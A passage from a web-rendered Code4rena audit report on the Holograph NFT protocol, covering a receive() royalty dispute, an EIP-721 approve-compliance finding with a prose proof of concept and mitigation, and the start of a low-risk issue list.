href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1306732804\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Upon further thoughts, believe it may qualify as high severity because it is a leak of value without requiring user error.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1319569845\">ACC01ADE (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>This is intended behavior, <code>mgs.value</code> is never leaked directly to custom implementations. For ERC721 there is a direct and secure method of withdrawing that value via the PA1D contract logic.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1319747993\">Trust (warden) commented</a>:</strong></p>\n<blockquote>\n<p>Yeah, but the withdrawal in PA1D will split the money between payout addresses. If developer implemented an ERC721 with receive() fallback, this call would be intended for that logic but instead the money is now treated as royalties to payout. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1320921141\">ACC01ADE (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>Developer can implement custom payable functions that guarantee msg.value transfer to their custom implementation. Receive function is reserved for royalty payouts that directly send funds to contract address. Plus it’s expected to be limited to 21k gas units, so there is no real use case where any logic can be accomplished with that much gas.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/468#issuecomment-1322294719\">ACC01ADE (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>That being said, this is a valid issue and sponsor confirms it. There is no clearly communicated code/documentation that explains this limitation to developers. Will make an attempt at mitigating this potential issue from happening on custom implementation side by providing clearer language and also adding revert functionality in the receive functions to get the attention of developers that might have missed this.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/468#ref-pullrequest-1452472274\">ACC01ADE (Holograph) linked a PR</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/88\">Feature/HOLO-605: C4 medium risk fixes</a></p>\n</blockquote>\n<hr>\n<h2 id=\"m-19-holographerc721approve-not-eip-721-compliant\" style=\"position:relative;\"><a href=\"#m-19-holographerc721approve-not-eip-721-compliant\" aria-label=\"m 19 holographerc721approve not eip 721 compliant permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/205\">[M-19] <code>HolographERC721.approve</code> not EIP-721 compliant</a></h2>\n<p><em>Submitted by Lambda</em></p>\n<p><a href=\"https://github.com/code-423n4/2022-10-holograph/blob/24bc4d8dfeb6e4328d2c6291d20553b1d3eff00b/src/enforcer/HolographERC721.sol#L272\">HolographERC721.sol#L272</a><br></p>\n<p>According to EIP-721, we have for <code>approve</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"45\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///  Throws unless `msg.sender` is the current NFT owner, or an authorized</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///  operator of the current owner.</span></span></span></code></pre>\n<p>An operator in the context of EIP-721 is someone who was approved via <code>setApprovalForAll</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"46\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @notice Enable or disable approval for a third party (&quot;operator&quot;) to manage</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///  all of `msg.sender`&#39;s assets</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @dev Emits the ApprovalForAll event. The contract MUST allow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///  multiple operators per owner.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _operator Address to add to the set of authorized operators</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @param _approved True if the operator is approved, false to revoke approval</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setApprovalForAll</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_operator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_approved</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Besides operators, there are also approved addresses for a token (for which <code>approve</code> is used). However, approved addresses can only transfer the token, see for instance the <code>safeTransferFrom</code> description:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"47\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @dev Throws unless `msg.sender` is the current owner, an authorized</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">///  operator, or the approved address for this NFT.</span></span></span></code></pre>\n<p><code>HolographERC721</code> does not distinguish between authorized operators and approved addresses when it comes to the <code>approve</code> function. Because <code>_isApproved(msg.sender, tokenId)</code> is used there, an approved address can approve another address, which is a violation of the EIP (only authorized operators should be able to do so).</p>\n<h3 id=\"proof-of-concept-17\" style=\"position:relative;\"><a href=\"#proof-of-concept-17\" aria-label=\"proof of concept 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof Of Concept</h3>\n<p>Bob calls <code>approve</code> to approve Alice on token ID 42 (that is owned by Bob). One week later, Bob sees that a malicious address was approved for his token ID 42 (e.g., because Alice got phished) and stole his token. Bob wonders how this is possible, because Alice should not have the permission to approve other addresses. However, becaue <code>HolographERC721</code> did not follow EIP-721, it was possible.</p>\n<h3 id=\"recommended-mitigation-steps-26\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-26\" aria-label=\"recommended mitigation steps 26 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Follow the EIP, i.e. do not allow approved addresses to approve other addresses.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1307792766\">alexanderattar (Holograph) commented</a>:</strong></p>\n<blockquote>\n<p>Originally, this was a design decision, but we will update the highlighted code to follow the ERC721 spec to avoid unknown consequences.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1320957930\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Consider as duplicate of <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/203\"><code>#203</code></a></p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1322711108\">Lambda (warden) commented</a>:</strong></p>\n<blockquote>\n<p>@gzeon - Isn’t this a different issue than <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/203\"><code>#203</code></a>? Both are related to ERC721 compliance, but they have different causes (wrong <code>safeTransferFrom</code> vs. wrong <code>approve</code>), very different impacts (failing transfers vs. unintended permissions), and the sponsor will implement different fixes for them (that for instance would not make sense to review together in a fix review)</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/205#issuecomment-1328124102\">gzeon (judge) commented</a>:</strong></p>\n<blockquote>\n<p>@Lambda - Fair.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/205#ref-pullrequest-1452472274\">ACC01ADE (Holograph) linked a PR</a>:</strong></p>\n<blockquote>\n<p><a href=\"https://github.com/holographxyz/holograph-protocol/pull/88\">Feature/HOLO-605: C4 medium risk fixes</a></p>\n</blockquote>\n<hr>\n<h1 id=\"low-risk-and-non-critical-issues\" style=\"position:relative;\"><a href=\"#low-risk-and-non-critical-issues\" aria-label=\"low risk and non critical issues permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Low Risk and Non-Critical Issues</h1>\n<p>For this contest, 113 reports were submitted by wardens detailing low risk and non-critical issues. The <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/68\">report highlighted below</a> by <strong>Rolezn</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/480\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/397\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/113\">adriro</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/492\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/358\">lukris02</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/314\">oyc_109</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/138\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/422\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/330\">__141345__</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/417\">peiw</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/74\">Picodes</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/13\">Rahoz</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/145\">RaoulSchaffranek</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/346\">ret2basic</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/374\">ryshaw</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/133\">sakman</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/22\">seyni</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/280\">Shinchan</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/91\">sikorico</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/224\">0xZaharina</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/93\">Tagir2003</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/321\">teawaterwire</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/396\">tnevler</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/191\">w0Lfrum</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/310\">Yiko</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/62\">8olidity</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/472\">ajtra</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/394\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/387\">aysha</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/363\">B2</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/271\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/17\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/87\">bobirichman</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/458\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/265\">catchup</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/235\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/55\">cdahlheimer</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/273\">ch0bu</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/327\">cryptostellar5</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/36\">csanuragjain</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/378\">delfin454000</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/324\">Diana</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/361\">djxploit</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/227\">erictee</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/129\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/300\">Jeiwan</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/442\">Josiah</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/50\">KoKo</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/3\">leosathya</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/501\">m_Rassska</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/207\">martin</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/117\">mcwildy</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/88\">mics</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/420\">nicobevi</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/312\">peanuts</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/326\">pedr02b2</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/405\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/73\">RedOneN</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/299\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/177\">rvierdiiev</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/389\">sakshamguruji</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/159\">saneryee</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/222\">securerodd</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/355\">svskaushik</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/433\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/333\">Waze</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/100\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/164\">0x52</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/279\">0x5rings</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/412\">0xhunter</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/135\">0xzh</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/415\">a12jmx</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/8\">Amithuddar</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/70\">arcoun</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/12\">ballx</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/351\">bulej93</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/237\">catwhiskeys</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/240\">caventa</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/247\">chaduke</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/382\">Chom</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/194\">chrisdior4</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/161\">cloudjunky</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/303\">cryptphi</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/470\">cylzxje</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/486\">d3e4</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/446\">Diraco</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/221\">Dravee</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/19\">durianSausage</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/393\">francoHacker</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/137\">Franfran</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/39\">gianganhnguyen</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/46\">gogo</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/334\">hansfriese</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/400\">i_got_hacked</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/471\">ignacio</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/121\">imare</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/500\">JC</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/388\">JrNet</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/239\">Jujic</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/284\">karanctf</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/156\">KingNFT</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/269\">kv</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/200\">Lambda</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/317\">louhk</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/439\">lyncurion</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/349\">malinariy</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/92\">Margaret</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/369\">Migue</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/365\">minhtrng</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/302\">Ocean_Sky</a>, <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/211\">PaludoX0</a>, and <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/401\">pashov</a>.</em></p>\n<p><em>Note: See warden’s <a href=\"https://github.com/code-423n4/2022-10-holograph-findings/issues/68\">original submission</a> for full details and PoCs on each item below.</em></p>\n<h2 id=\"01-missing-checks-for-address0x0\" style=\"position:relative;\"><a href=\"#01-missing-checks-for-address0x0\" aria-label=\"01 missing checks for address0x0 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[01] Missing Checks for Address(0x0)</h2>\n<p>Lack of zero-address validation on address parameters may lead to transaction reverts, waste gas, require resubmission of transactions and may even force contract redeployments in certain cases within the protocol.</p>\n<h3 id=\"recommended-mitigation-steps-27\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-27\" aria-label=\"recommended mitigation steps 27 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider adding explicit zero-address validation on input parameters of address type.</p>\n<h2 id=\"02-use-safetransfer-instead-of-transfer\" style=\"position:relative;\"><a href=\"#02-use-safetransfer-instead-of-transfer\" aria-label=\"02 use safetransfer instead of transfer permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[02] Use <code>safetransfer</code> Instead Of <code>transfer</code></h2>\n<p>It is good to add a <code>require()</code> statement that checks the return value of token transfers or to use something like OpenZeppelin’s <code>safeTransfer</code>/<code>safeTransferFrom</code> unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.</p>\n<p>For example, Some tokens do not implement the ERC20 standard properly but are still accepted by most code that accepts ERC20 tokens. For example Tether (USDT)‘s transfer() and transferFrom() functions do not return booleans as the specification requires, and instead have no return value. When these sorts of tokens are cast to IERC20, their function signatures do not match and therefore the calls made, revert.</p>\n<h3 id=\"recommended-mitigation-steps-28\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-28\" aria-label=\"recommended mitigation steps 28 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider using <code>safeTransfer</code>/<code>safeTransferFrom</code> or <code>require()</code> consistently.</p>\n<h2 id=\"03-unused-receive-function-will-lock-ether-in-contract\" style=\"position:relative;\"><a href=\"#03-unused-receive-function-will-lock-ether-in-contract\" aria-label=\"03 unused receive function will lock ether in contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[03] Unused <code>receive()</code> Function Will Lock Ether In Contract</h2>\n<p>If the intention is for the Ether to be used, the function should call another function, otherwise it should revert</p>\n<h3 id=\"recommended-mitigation-steps-29\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-29\" aria-label=\"recommended mitigation steps 29 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The function should call another function, otherwise it should revert</p>\n<h2 id=\"04-use-_safemint-instead-of-_mint\" style=\"position:relative;\"><a href=\"#04-use-_safemint-instead-of-_mint\" aria-label=\"04 use _safemint instead of _mint permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[04] Use <code>_safeMint</code> instead of <code>_mint</code></h2>\n<p>According to openzepplin’s ERC721, the use of <code>_mint</code> is discouraged, use <em>safeMint whenever possible.<br>\n<a 